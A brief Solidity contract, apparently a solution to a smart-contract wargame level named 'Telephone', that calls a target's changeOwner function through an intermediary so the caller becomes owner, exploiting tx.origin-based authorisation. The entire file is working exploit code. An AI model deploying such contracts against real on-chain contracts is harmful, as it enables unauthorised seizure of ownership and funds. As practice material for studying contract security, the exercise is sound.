// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneExpolit {

	function makeMeOwner(address telephoneContractAddress) external {
		ITelephone telephoneContract = ITelephone(telephoneContractAddress);
		telephoneContract.changeOwner(msg.sender);
	}
}